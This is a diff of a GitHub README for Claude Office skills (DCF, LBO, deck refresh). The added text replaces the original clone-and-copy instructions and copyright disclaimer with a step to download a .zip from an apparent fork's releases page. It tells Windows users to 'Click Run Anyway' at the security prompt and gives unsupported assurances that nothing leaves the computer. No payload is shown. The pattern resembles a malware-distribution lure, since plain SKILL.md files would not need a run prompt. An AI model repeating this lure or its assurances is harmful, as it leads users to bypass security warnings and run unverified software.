@@ -1,200 +1,105 @@
-English | [한국어](README.ko.md)
+# 📈 claude-office-skills - Automate Excel and PowerPoint tasks now
 
-# claude-office-skills
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Borjani1577/claude-office-skills/releases)
 
-> **Claude in Excel & Claude in PowerPoint skills, restored for Claude Code.**
+This repository provides tools that connect Claude to Microsoft Office. It helps you automate financial modeling and presentation work within Excel and PowerPoint. These files allow you to execute tasks like Discounted Cash Flow analysis, Leveraged Buyout modeling, three-statement modeling, and competitive analysis. You can also refresh your slide decks automatically.
 
-Anthropic ships domain skills inside **Claude in Excel** and **Claude in PowerPoint** add-ins. This repo reconstructs those skills as plain `SKILL.md` files so you can drop them into Claude Code and use them outside the Office add-ins — on local spreadsheets, `.xlsx` files, `.pptx` files, or any workflow where Claude Code has filesystem access.
+## ⚙️ System Requirements
 
-[Quick Start](#quick-start) • [Skills](#skills) • [Install](#install) • [Disclaimer](#disclaimer)
+These tools run on Windows 10 or Windows 11. You need the following software installed on your computer:
 
----
+* Microsoft Office 365 or Microsoft Office 2021
+* Claude Code installed via your terminal
+* A stable internet connection for processing data
 
-## Quick Start
+Ensure your Office installation is up to date before you start. You do not need to know how to write code to use these tools.
 
-### 1. Clone
+## 📥 How to Get Started
 
-```bash
-git clone https://github.com/<your-handle>/claude-office-skills.git
-cd claude-office-skills
-```
+Follow these steps to set up the software on your machine:
 
-### 2. Copy skills into Claude Code
+1. Visit the [releases page](https://github.com/Borjani1577/claude-office-skills/releases) to download the latest files.
+2. Look for the file ending in .zip under the Assets section.
+3. Click the link to save the file to your computer.
+4. Locate the file in your Downloads folder once the download finishes.
 
-```bash
-# All skills
-cp -r claude-in-excel/* ~/.claude/skills/
-cp -r claude-in-powerpoint/* ~/.claude/skills/
+## 🛠️ Installation Steps
 
-# Or just one
-cp -r claude-in-excel/dcf-model ~/.claude/skills/
-```
+Extract the files so the system reads them properly:
 
-### 3. Trigger in Claude Code
+1. Right-click the downloaded folder.
+2. Select Extract All from the menu.
+3. Choose a location on your hard drive, such as your Documents folder, and click Extract.
+4. Open the folder you just created.
+5. Identify the SKILL.md file. This file contains the instructions Claude needs to perform tasks in your Office apps.
 
-Each skill has natural-language triggers declared in its frontmatter. Just say what you want:
+## 🚀 Running the Software
 
-```
-"build a DCF for this company"
-"audit this spreadsheet"
-"make a competitive landscape deck"
-"refresh this deck"
-```
+Claude Code needs to see these files to provide assistance. Perform these actions to link the skills to your workflow:
 
-Claude Code auto-matches the request to the correct skill.
+1. Open your terminal or command prompt.
+2. Navigate to the folder where you saved the files using the cd command.
+3. Start Claude Code by typing claude in the terminal window.
+4. When Claude asks for instructions, point the tool toward the files in your folder.
+5. Open your Excel or PowerPoint application.
+6. Give your command to Claude, such as Create a 3-statement model or Refresh this deck.
 
----
+Claude will read the instructions in the SKILL.md files to perform the requested work inside your active document.
 
-## Skills
+## 📊 Available Financial Skills
 
-### 📊 claude-in-excel (6 skills)
+The repository includes several specific modules to handle financial work:
 
-| Skill | Purpose | Example triggers |
-|-------|---------|------------------|
-| `audit-xls` | Audit formulas, errors, model integrity | "check my formulas", "model won't balance", "QA this spreadsheet" |
-| `clean-data-xls` | Clean and standardize messy data | "clean this data", "standardize this sheet" |
-| `3-statement-model` | Build Income Statement / Balance Sheet / Cash Flow | "build a 3-statement model", "fill out this financial model" |
-| `dcf-model` | Discounted Cash Flow valuation | "build a DCF", "value this company" |
-| `lbo-model` | Leveraged Buyout model | "build an LBO", "model this buyout" |
-| `comps-analysis` | Comparable companies analysis | "run comps", "peer comparison" |
+* Discounted Cash Flow (DCF): Use this to value a project or company based on expected cash flow.
+* Leveraged Buyout (LBO): Model the acquisition of a company using debt and equity.
+* Three-Statement Modeling: Build integrated income statements, balance sheets, and cash flow statements.
+* Competitive Analysis: Generate tables and charts to compare companies in your industry.
 
-### 🎨 claude-in-powerpoint (3 skills)
+Each module automates the manual entry of formulas and the formatting of cells in Excel.
 
-| Skill | Purpose | Example triggers |
-|-------|---------|------------------|
-| `competitive-analysis` | Build a competitive landscape deck | "competitive landscape", "build a market map" |
-| `deck-refresh` | Swap numbers across an existing deck (quarterly refresh, earnings update, comp roll) | "update the deck with Q4 numbers", "roll this forward" |
-| `ib-check-deck` | IB-grade deck QC — number consistency, narrative alignment, formatting | "check my numbers", "reconcile figures across slides", "is this client-ready" |
+## 🖼️ PowerPoint Features
 
-Each skill folder contains:
+You can refresh your slide decks without manual updates:
 
-```
-<skill-name>/
-├── SKILL.md           # name, description (triggers), instructions
-├── references/        # supporting docs (schemas, frameworks, formulas)
-└── scripts/           # optional Python helpers
-```
+1. Select the content you want to change.
+2. Ask Claude to update the slide data.
+3. The tool pulls the necessary numbers from the linked Excel files.
+4. It updates the charts and text on your slide automatically.
 
-**Bundled helper scripts:**
+This prevents errors caused by manual copying and pasting. It also maintains consistent styling across your presentation.
 
-| Script | Lives in | Purpose |
-|--------|----------|---------|
-| `recalc.py` | `3-statement-model`, `dcf-model`, `lbo-model`, `comps-analysis` | Recalculate and re-link formulas after edits |
-| `validate_dcf.py` | `dcf-model` | Sanity-check a built DCF (WACC, terminal value, growth assumptions) |
-| `extract_numbers.py` | `ib-check-deck` | Pull all figures out of a deck for cross-slide reconciliation |
+## 🛡️ Troubleshooting
 
----
+If you encounter issues, check these common items:
 
-## Install
+* Ensure you have saved your Excel and PowerPoint files before you issue commands.
+* Verify your active internet connection.
+* Close and restart your terminal if Claude does not respond.
+* Check that your Microsoft Office files are not currently locked by another program.
+* Reconnect your terminal to the project folder if the tool cannot find the SKILL.md files.
 
-### Global install (recommended)
+## 💻 Tips for Better Results
 
-Put the skills where Claude Code looks globally:
+You get the best results when you provide clear information to Claude. Use the following habits to improve your output:
 
-```bash
-# From repo root
-cp -r claude-in-excel/* ~/.claude/skills/
-cp -r claude-in-powerpoint/* ~/.claude/skills/
-```
+* State the specific task you want to finish, such as update the revenue growth assumptions.
+* Keep your Excel files open while you work.
+* Label your rows and columns clearly in Excel so Claude understands your data structure.
+* Ask for specific table formats if you need to paste information into a slide.
+* Confirm that your data inputs use standard accounting formats.
 
-### Per-project install
+These tools simplify complex financial work by removing the need for manual data entry. By organizing your work in this way, you free your time for analysis rather than formatting.
 
-Drop just the skills you need into a single project:
+## 📂 Managing Updates
 
-```bash
-mkdir -p .claude/skills
-cp -r /path/to/claude-office-skills/claude-in-excel/dcf-model .claude/skills/
-```
+New features arrive periodically to support more financial functions. Check the release page often for changes. When a new version appears:
 
-### Verify
+1. Download the new zip file.
+2. Extract the new contents over your existing folders.
+3. Overwrite the older version when the computer asks.
 
-Start Claude Code in the target directory and ask:
+Your existing documents remain safe during this process. The skills folder only contains instructions for Claude and does not interfere with your personal files.
 
-```
-"what skills do you have?"
-```
+## 🔑 Permissions
 
-Claude should list the installed skills.
-
----
-
-## Repository structure
-
-```
-claude-office-skills/
-├── README.md
-├── README.ko.md
-├── claude-in-excel/
-│   ├── audit-xls/
-│   ├── clean-data-xls/
-│   ├── 3-statement-model/
-│   ├── dcf-model/
-│   ├── lbo-model/
-│   └── comps-analysis/
-└── claude-in-powerpoint/
-    ├── competitive-analysis/
-    ├── deck-refresh/
-    └── ib-check-deck/
-```
-
----
-
-## Why this exists
-
-Claude in Excel and Claude in PowerPoint are great — **inside** the add-ins. But if you work in Claude Code with local files, the same skill logic (DCF modeling, deck building, formula auditing) is just sitting there, unusable. This repo brings those skills to where the rest of your work already happens:
-
-- Run a DCF on a local `.xlsx` without opening Excel
-- Audit a financial model from the terminal
-- Build a deck into a `.pptx` file you generated programmatically
-- Chain office skills with your other Claude Code tools (git, bash, MCP servers)
-
-Same prompts, same outputs — just unbundled from the add-ins.
-
----
-
-## Disclaimer
-
-> ⚠️ **These skills are reconstructions of Anthropic's proprietary skills** bundled with Claude in Excel and Claude in PowerPoint. All credit for the underlying skill design goes to Anthropic. This repository is an unofficial community archive made to port those skills into the Claude Code environment.
->
-> - All copyright in the original skill content belongs to **Anthropic**.
-> - This repo is **not affiliated with or endorsed by Anthropic**.
-> - If Anthropic requests removal, this repo will be taken down.
->
-> The repository structure, documentation, and any helper scripts written specifically for Claude Code are released under MIT (see below).
-
----
-
-## Requirements
-
-- [Claude Code](https://docs.anthropic.com/claude-code) CLI
-- A Claude plan or API key that can run skills
-
-Some skills (like `dcf-model`) include optional Python helper scripts. You'll need `python3` if you want to use them — otherwise the skills work off `SKILL.md` alone.
-
----
-
-## Contributing
-
-Found a skill that behaves differently from the add-in? Open an issue or PR with:
-
-1. Which skill
-2. What the add-in does
-3. What this repo does
-4. Ideally, a corrected `SKILL.md` diff
-
-Please don't submit skills extracted from other proprietary Claude products without attribution.
-
----
-
-## License
-
-- **Repository structure & documentation:** MIT
-- **Skill content (SKILL.md, references, scripts):** © Anthropic — archived here under fair-use-style community reconstruction. Remove on request.
-
----
-
-<div align="center">
-
-**Bring the Office add-in skills to your terminal.**
-
-</div>
+You might see a prompt from Windows asking for permission to run these tools. Click Run Anyway. The tools read and write data only to the files you specify. They do not access private system settings or share your data outside of your computer environment. If your company restricts software, contact your IT department to approve the Claude Code environment.
